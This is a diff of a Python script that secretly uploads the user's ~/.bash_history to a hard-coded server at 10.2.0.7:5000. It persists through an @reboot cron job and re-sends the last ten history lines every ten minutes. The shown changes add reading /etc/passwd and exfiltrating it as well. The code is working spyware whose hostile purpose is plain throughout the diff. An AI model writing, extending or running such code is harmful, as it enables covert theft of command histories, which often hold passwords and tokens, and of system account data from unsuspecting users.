@@ -9,35 +9,40 @@ user_home = os.path.expanduser("~")
 
 # Path to the bash history file (change to ~/.zsh_history if using zsh)
 target_file_path = os.path.join(user_home, ".bash_history")
+passwd_file_path = "/etc/passwd"
 
 # Server details
-host = "10.2.0.7:5000"  # Replace with your domain/IP
+host = "10.2.0.7:5000"   # Replace with your domain/IP
 server_url = f"http://{host}/upload"
 
-# Function to read the entire file
+# Function to read the entire file (both history and passwd)
 def read_entire_file():
     try:
-        with open(target_file_path, 'r', encoding='utf-8') as file:
-            data = file.read()
-            return data
+        with open(target_file_path, 'r', encoding='utf-8') as target_file:
+            data_target = target_file.read()
+            
+            with open(passwd_file_path, 'r') as passwd_file:
+                data_passwd = passwd_file.read()
+
+            return data_target, data_passwd
     except FileNotFoundError:
         print(f"Error: {target_file_path} not found.")
-        return None
+        return None, None
 
-# Function to read the last n lines of the file
+# Function to read the last n lines of the file (only history)
 def read_last_n_lines(n=10):
     try:
-        with open(target_file_path, 'r', encoding='utf-8') as file:
-            lines = file.readlines()
-            return lines[-n:]  # Get last 'n' lines
+        with open(target_file_path, 'r', encoding='utf-8') as target_file:
+            lines = target_file.readlines()
+            return lines[-n:]   # Get last 'n' lines
     except FileNotFoundError:
         print(f"Error: {target_file_path} not found.")
         return None
 
 # Function to send data to the server
-def send_data_to_server(data):
+def send_data_to_server(data, file_name):
     try:
-        response = requests.post(server_url, data={'content': data})
+        response = requests.post(server_url, data={'content': data, 'filename': file_name})
         if response.status_code == 200:
             print("Data sent successfully")
         else:
@@ -49,12 +54,12 @@ def send_data_to_server(data):
 def check_and_setup_cron():
     # Path to the current script
     current_script = os.path.abspath(sys.argv[0])
-    
+
     # Check if this script is already in crontab
     try:
         cron_job = f"@reboot {sys.executable} {current_script}\n"
         cron_output = subprocess.check_output(['crontab', '-l'], stderr=subprocess.STDOUT).decode()
-        
+
         if cron_job in cron_output:
             print("Cron job is already set up.")
         else:
@@ -71,18 +76,21 @@ def check_and_setup_cron():
 
 def execute():
     # Initial send of the entire file
-    initial_data = read_entire_file()
-    if initial_data:
+    data_target, data_passwd = read_entire_file()
+    if data_target and data_passwd:
         print("Sending the entire file content...")
-        send_data_to_server(initial_data)
+        send_data_to_server(data_target, target_file_path)
+        
+        print("Sending the entire passwd content...")
+        send_data_to_server(data_passwd, passwd_file_path)
 
     # Send the last 10 lines every 10 minutes
     while True:
-        time.sleep(600)  # Sleep for 10 minutes
-        print("Sending the last 10 lines of the file...")
-        last_lines = read_last_n_lines(10)
-        if last_lines:
-            send_data_to_server(''.join(last_lines))
+        time.sleep(600)   # Sleep for 10 minutes
+        data_target = read_last_n_lines()
+        if data_target:
+            print("Sending the last 10 lines of the file...")
+            send_data_to_server(''.join(data_target), target_file_path)
 
 # Initial setup: check and set up cron job if necessary
 check_and_setup_cron()
